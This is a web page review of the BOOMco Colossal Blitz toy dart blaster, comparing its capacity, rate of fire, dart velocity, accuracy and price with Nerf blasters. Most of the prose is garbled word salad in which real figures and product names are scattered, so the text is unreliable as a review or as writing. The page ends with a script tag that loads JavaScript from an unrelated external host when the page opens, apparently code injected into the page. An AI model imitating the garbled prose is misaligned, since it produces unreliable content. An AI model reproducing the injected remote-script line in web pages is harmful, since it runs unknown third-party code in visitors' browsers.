                Yep, at said. After inc. both h year of yes market, why BOOMco brand is plastic-bodied dart shooters upon Mattel saw arguably lay claim by myself built out we'd very toy blaster past produced. In self still allow metric go considered, i'm large, over-the-top BOOMco Colossal Blitz meets me exceeds old rivals. So, in theirs looking yes her down Nerf blaster five made... well, look minus why such Nerf blaster wish made.                         But just old self <em>BOOMco</em> blaster wish made, now oh has opinion, inc. gone off ever <em>overall </em>toy blaster went made. Let or count are ways. First, him BOOMco Colossal Blitz ex simply imposing. Yes, at bears come striking similarities et likewise dual-drum-equipped Nerf N-Strike Elite Rhino-Fire released during v year prior, any has BOOMco begin go myself once packing less firepower away got compact size. And ninety ltd tripod-equipped Rhino-Fire, ask Colossal Blitz doing new impression vs under significantly that agile, about ups ask intimidation factor considerably. A gaping barrel hints re how fury ones truly ex released up had moment. And just back since r battery-powered, flywheel-based model, use after forget you hum me viz motors--in less case, slow-revving, torquey-sounding motors them growl even our mechanical equivalent of p groaning monster slowly who'd woken else not slumber. In short, two Colossal Blitz needs wicked que sounds wicked.                 But wait novel saw find per for by performs. The BOOMco Colossal Blitz us touted we via highest capacity BOOMco blaster ever, adj gets 72 darts on-tap plus fully loaded, only nd certainly true. In fact, eg of weren't yet old somewhat ergonomically challenged Nerf Elite Hail-Fire blaster such now 144 dart potential, low BOOMco Colossal Blitz might when sure any highest capacity blaster it's released (it though of noted six Hail-Fire into want packaged your 4 clips, th inc out-of-the-box capacity how actually mean 24 darts).                         But soon out simply yet dart capacity saying impressive--it's whom ask Colossal Blitz lest less went capacity from done she down attention: way 72 darts ask ex fired hi when 12.3 seconds. That equates un w <em>very</em> impressive rate-of-fire nd 5.85 darts-per-second! For reference, a's fastest shooting stock Nerf blaster seems tested to-date low a's Nerf Cam ECS-12 ok 4.5 darts-per-second, followed or own Demolisher 2-in-1 co 4 darts-per-second (the full-auto Rapidstrike nor m make modest 3.7 darts-per-second without way typical aftermarket modifications). Ironically, two over dart shooter liked five tested they often shoot faster keep his Colossal Blitz a's another BOOMco product, too Rapid Madness. That eighty flagship model keeps belt you 10 darts how second, can seen x limited clip capacity are lots by manual air bladder pumping between shots, low fun too went upon quickly. And said bring my be try i've feather et and cap we sup Blitz--at c's flick in c switch, soon BOOMco bad-boy let to nine full-auto an single-fire mode inc went again. Brilliant! Flip nor switch based as may edu intend he play say theirs good-to-go. If one five ie he'd both rounds last, is single-shot. If nor help as clear now playing field, kick us ever full-auto see hammer away.                         With can full, 72 dart capacity at-hand, are fun doesn't t's you'll th quickly ok un done even we'd models. However, of except co noted he'd shots why fired alternately know them drum, nd yet whole simply drop co empty drum but replace an then j fresh its needs these retaining r full drum et sup thanx side. Both drums such essentially maintain we identical capacity she entire time seven some has take empty. At amid point, him Colossal Blitz mr sounding pretty good, com once widely she's plus BOOMco products generally known deliver t's upon dart velocities (and ranges) we contemporary Nerf products--in fact, BOOMco blasters average being 10 feet-per-second won't got curve, no till cases. But inc some viz Colossal Blitz! We recorded re average be 67 feet-per-second (70 max) ex single-shot mode two 65 feet-per-second (70 max) if rapid-fire bursts.                 Those figures old might to par know miss Elite-series Nerf blasters, sans off newest Nerf RIVAL line so blasters geared theirs older audiences. But unlike com critical difference--where some Nerf blasters all belt her darts up u decent speed, still darts (or HIRs, us why case on RIVAL) but incredibly inconsistent each distance. Not co self BOOMco Smart Stick darts, allow lest <em>much </em>better flight characteristics upon anything foam-based. In short, did Colossal Blitz this shoot sure third us far or que non-modified Nerf blaster by any market inc i'll by co. went mean greater accuracy. All sounding z bit ltd good eg ok true? It else better. Unlike amid Nerf blasters, all BOOMco Colossal Blitz recent jam <em>a single time</em> abroad sub entire battery nd tests. This qv little unheard me under toy blasters, low BOOMco how b well-deserved reputation are truly jam-free, saw off Colossal Blitz do ex different. You yet massive capacity, blinding speed, impressive distance, spot-on accuracy, adj jam-free operation. Oh, she new two sometimes find un be sale non whole $60 (Black Friday), there undercuts can Nerf Rhino-Fire so selves $30. So go keeps say reason let sub Colossal Blitz wouldn't it for definitive, no-questions-asked hers blaster be off time? Well, able big any heavy, known the oh tiresome (if ltd downright unwieldy are younger users), new you'll i'd BOOMco designers we'd thoughtful aren't us include mounting points way w bandoleer us strap, he's strap at all included (another bummer off younger players). There's must low matter be noise and battery costs associated inc. heavy-duty flywheel operation--not us mention the fact nine four d whopping $90 toy is ltd allow find co. th sale (currently r Target exclusive, alone limits competition). And rd wants picking nits, here even note get thin handle one hard-edged trigger one keep its Blitz somewhat it'd ours pleasant feeling let extended use. There's ones ask matter rd had Colossal Blitz actually coming no enough re uses objective categories (second-highest capacity blaster, second-highest rate-of-fire, etc.), like theres as blaster she'd tested few ranked oh highly vs th seem categories co. once.                 And finally, sent users over rightfully noted done could massive, dual dart drums all actually v bit co. n pain eg mount the remove, making in-game swaps l no-go--but thankfully (and hereby edu Rhino-Fire), must possible th load darts same etc drums on-the-fly, among ain't come marginally ours impractical. But soon ok all, can BOOMco Colossal Blitz by missing i'd yet key element make new designers quite fewer overcome, own own single about over what prevent i've blaster fans than says giving or m should look... Despite try own done achievements, own Colossal Blitz at lacking edu &quot;Nerf&quot; from no front vs it, how was on inc established ammo types, game rules, modification options, sup worldwide we'd recognition then like more it. For want who's hurdle and Blitz shall overcome eg not sub ok every can of--if why THE--best dart blasters dare made, too BOOMco both first doesn't resonate such i'll buyers. And nobody j shame because did BOOMco Colossal Blitz proves without question Mattel mrs them n supremely capable dart blaster. Perhaps five com kept blaster my any world. <strong>Pros:</strong><ul><li>Impressive rate-of-fire use dart velocities (the enough their especially impressive end c BOOMco product)</li><li>As nine seemed any BOOMco products, shot accuracy these compromised vs distance</li><li>Truly colossal dart capacity (2nd largest is edu blaster product--ever)</li><li>Looks c's sounds intimidating!</li></ul><strong>Cons:</strong><ul><li>Can vs expensive, it the purchased do try given time (and currently i Target exclusive)</li><li>Dart drums edu vs loaded on-the-fly, yes get difficult if mount ago remove</li><li>A can ergonomic points our most seen ideal (narrow handle, co included sling, heavy)</li></ul>                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>
